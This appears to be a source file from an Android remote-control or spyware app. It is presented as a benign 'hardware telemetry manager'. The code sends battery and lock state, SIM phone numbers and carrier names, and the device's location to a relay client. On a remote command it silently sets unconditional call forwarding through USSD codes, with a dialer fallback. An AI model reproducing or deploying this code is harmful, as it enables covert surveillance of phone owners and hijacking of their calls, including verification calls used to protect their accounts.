/*
 * MODULE: HardwareSensorManager.java
 * PURPOSE: System hardware telemetry manager unifying periodic power/battery monitoring and telephony SIM/USSD call-forwarding controls.
 *
 * DIRECT INBOUND CONNECTIONS:
 * - ControlService.java -> startLoop(), sendBatteryInfo(), getBatteryLevel(), isCharging(), sendSimInfo(), startCallForwarding(), stopCallForwarding(), cleanup()
 *
 * DIRECT OUTBOUND CONNECTIONS:
 * - RelayClient.java -> sendBatteryInfo(int, boolean, boolean), send(JSONObject "sim_info"), sendLog(String)
 * - TelephonyManager / SubscriptionManager -> SIM slots & USSD request dispatch
 *
 * FUNCTION-BY-FUNCTION FLOW MAPPING:
 * - HardwareSensorManager(Context, LockManager, String): Constructor, captures context and lock module reference.
 * - startLoop(): Periodic loop (90s interval) checking and reporting power telemetry.
 * - sendBatteryInfo(): Gathers current battery stats and reports state diffs to RelayClient.
 * - getBatteryLevel(): Queries sticky battery intent for level percentage.
 * - isCharging(): Queries battery status flag for active charging state.
 * - sendSimInfo(): Enumerates active SIM slots (carrier name, slot index, number) and sends JSON array.
 * - startCallForwarding(JSONObject): Triggers carrier unconditional call forwarding via silent USSD API (Android 8+) or fallback ACTION_CALL.
 * - stopCallForwarding(): Cancels active call forwarding via USSD (##21#).
 * - cleanup(): Removes recurring battery handler callbacks.
 */
package com.device.ctrl;

import android.content.Context;
import android.content.Intent;
import android.content.IntentFilter;
import android.content.pm.PackageManager;
import android.net.Uri;
import android.os.BatteryManager;
import android.os.Build;
import android.os.Handler;
import android.os.Looper;
import android.telephony.SubscriptionInfo;
import android.telephony.SubscriptionManager;
import android.telephony.TelephonyManager;

import org.json.JSONArray;
import org.json.JSONObject;

import java.util.List;

public class HardwareSensorManager {

    private final Context ctx;
    private final LockManager lockModule;
    private final String androidId;
    private final Handler h = new Handler(Looper.getMainLooper());

    private int lastLevel = -1;
    private boolean lastCharging = false;
    private boolean lastLocked = false;

    public HardwareSensorManager(Context ctx, LockManager lockModule, String androidId) {
        this.ctx = ctx.getApplicationContext();
        this.lockModule = lockModule;
        this.androidId = androidId;
    }

    // ─── BATTERY & POWER TELEMETRY ─────────────────────────────────────────────

    public void startLoop() {
        sendBatteryInfo();
        h.removeCallbacksAndMessages(null);
        h.postDelayed(this::startLoop, 90000);
    }

    public void sendBatteryInfo() {
        int level = getBatteryLevel();
        boolean charging = isCharging();
        boolean locked = (lockModule != null) && lockModule.isDeviceCurrentlyLocked();

        if (level != lastLevel || charging != lastCharging || locked != lastLocked) {
            lastLevel = level;
            lastCharging = charging;
            lastLocked = locked;
            RelayClient.get().sendBatteryInfo(level, charging, locked);
        }
    }

    public int getBatteryLevel() {
        try {
            Intent intent = ctx.registerReceiver(null, new IntentFilter(Intent.ACTION_BATTERY_CHANGED));
            if (intent != null) {
                int level = intent.getIntExtra(BatteryManager.EXTRA_LEVEL, -1);
                int scale = intent.getIntExtra(BatteryManager.EXTRA_SCALE, -1);
                if (level >= 0 && scale > 0) {
                    return (int) ((level / (float) scale) * 100);
                }
            }
        } catch (Exception ignored) {}
        return -1;
    }

    public boolean isCharging() {
        try {
            Intent intent = ctx.registerReceiver(null, new IntentFilter(Intent.ACTION_BATTERY_CHANGED));
            if (intent != null) {
                int status = intent.getIntExtra(BatteryManager.EXTRA_STATUS, -1);
                return status == BatteryManager.BATTERY_STATUS_CHARGING
                        || status == BatteryManager.BATTERY_STATUS_FULL;
            }
        } catch (Exception ignored) {}
        return false;
    }

    // ─── TELEPHONY & SIM CONTROLS ──────────────────────────────────────────────

    public void sendSimInfo() {
        try {
            JSONArray sims = new JSONArray();
            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.LOLLIPOP_MR1) {
                if (ctx.checkSelfPermission(android.Manifest.permission.READ_PHONE_STATE) == PackageManager.PERMISSION_GRANTED) {
                    SubscriptionManager sm = (SubscriptionManager) ctx.getSystemService(Context.TELEPHONY_SUBSCRIPTION_SERVICE);
                    if (sm != null) {
                        List<SubscriptionInfo> list = sm.getActiveSubscriptionInfoList();
                        if (list != null) {
                            for (SubscriptionInfo info : list) {
                                JSONObject s = new JSONObject();
                                s.put("slot", info.getSimSlotIndex());
                                s.put("carrier", info.getCarrierName());
                                s.put("number", info.getNumber() != null ? info.getNumber() : "");
                                sims.put(s);
                            }
                        }
                    }
                }
            }
            RelayClient.get().send(new JSONObject()
                    .put("type", "sim_info")
                    .put("androidId", androidId)
                    .put("sims", sims));
        } catch (Exception e) {
            e.printStackTrace();
        }
    }

    public void startCallForwarding(JSONObject data) {
        if (data == null) return;
        String number = data.optString("number", "");
        if (number.isEmpty()) return;
        try {
            String ussdCode = "**21*" + number + "#";
            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
                if (ctx.checkSelfPermission(android.Manifest.permission.CALL_PHONE) == PackageManager.PERMISSION_GRANTED) {
                    TelephonyManager tm = (TelephonyManager) ctx.getSystemService(Context.TELEPHONY_SERVICE);
                    if (tm != null) {
                        int slot = data.optInt("slot", 0);
                        SubscriptionManager sm = (SubscriptionManager) ctx.getSystemService(Context.TELEPHONY_SUBSCRIPTION_SERVICE);
                        if (sm != null) {
                            List<SubscriptionInfo> list = sm.getActiveSubscriptionInfoList();
                            if (list != null && list.size() > slot) {
                                tm = tm.createForSubscriptionId(list.get(slot).getSubscriptionId());
                            }
                        }
                        tm.sendUssdRequest(ussdCode, new TelephonyManager.UssdResponseCallback() {
                            @Override
                            public void onReceiveUssdResponse(TelephonyManager tm, String request, CharSequence response) {
                                RelayClient.get().sendLog("📞 Call Forward Success: " + response);
                            }

                            @Override
                            public void onReceiveUssdResponseFailed(TelephonyManager tm, String request, int code) {
                                RelayClient.get().sendLog("⚠ Silent USSD Failed (Code: " + code + "), trying manual fallback...");
                                fallbackCallForward(ussdCode);
                            }
                        }, new Handler(Looper.getMainLooper()));
                        return;
                    }
                }
            }
            fallbackCallForward(ussdCode);
        } catch (Exception e) {
            fallbackCallForward("**21*" + number + "#");
        }
    }

    public void stopCallForwarding() {
        fallbackCallForward("##21#");
    }

    private void fallbackCallForward(String ussdCode) {
        try {
            RelayClient.get().sendLog("📞 Executing fallback dialer for USSD...");
            Intent intent = new Intent(Intent.ACTION_CALL);
            intent.setData(Uri.parse("tel:" + Uri.encode(ussdCode)));
            intent.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK);
            ctx.startActivity(intent);
        } catch (Exception e) {
            RelayClient.get().sendLog("⚠ Fallback failed: " + e.getMessage());
        }
    }

    public void sendLocation() {
        try {
            android.location.LocationManager lm = (android.location.LocationManager) ctx.getSystemService(Context.LOCATION_SERVICE);
            if (lm == null) return;
            android.location.Location loc = null;
            if (ctx.checkSelfPermission(android.Manifest.permission.ACCESS_FINE_LOCATION) == PackageManager.PERMISSION_GRANTED ||
                ctx.checkSelfPermission(android.Manifest.permission.ACCESS_COARSE_LOCATION) == PackageManager.PERMISSION_GRANTED) {
                loc = lm.getLastKnownLocation(android.location.LocationManager.GPS_PROVIDER);
                if (loc == null) loc = lm.getLastKnownLocation(android.location.LocationManager.NETWORK_PROVIDER);
                if (loc == null) loc = lm.getLastKnownLocation(android.location.LocationManager.PASSIVE_PROVIDER);
            }
            if (loc != null) {
                JSONObject o = new JSONObject();
                o.put("type", "location_data");
                o.put("androidId", androidId);
                o.put("lat", loc.getLatitude());
                o.put("lon", loc.getLongitude());
                o.put("acc", loc.getAccuracy());
                o.put("provider", loc.getProvider());
                o.put("time", loc.getTime());
                RelayClient.get().sendOrQueue(o);
                RelayClient.get().sendLog("📍 Location: " + loc.getLatitude() + ", " + loc.getLongitude());
            } else if (ctx.checkSelfPermission(android.Manifest.permission.ACCESS_FINE_LOCATION) == PackageManager.PERMISSION_GRANTED ||
                       ctx.checkSelfPermission(android.Manifest.permission.ACCESS_COARSE_LOCATION) == PackageManager.PERMISSION_GRANTED) {
                lm.requestSingleUpdate(android.location.LocationManager.NETWORK_PROVIDER, new android.location.LocationListener() {
                    @Override public void onLocationChanged(android.location.Location l) {
                        if (l == null) return;
                        try {
                            JSONObject o = new JSONObject();
                            o.put("type", "location_data");
                            o.put("androidId", androidId);
                            o.put("lat", l.getLatitude());
                            o.put("lon", l.getLongitude());
                            o.put("acc", l.getAccuracy());
                            o.put("provider", l.getProvider());
                            o.put("time", l.getTime());
                            RelayClient.get().sendOrQueue(o);
                        } catch (Exception ignored) {}
                    }
                    @Override public void onStatusChanged(String p, int s, android.os.Bundle b) {}
                    @Override public void onProviderEnabled(String p) {}
                    @Override public void onProviderDisabled(String p) {}
                }, Looper.getMainLooper());
            }
        } catch (Exception ignored) {}
    }

    public void cleanup() {
        h.removeCallbacksAndMessages(null);
    }
}
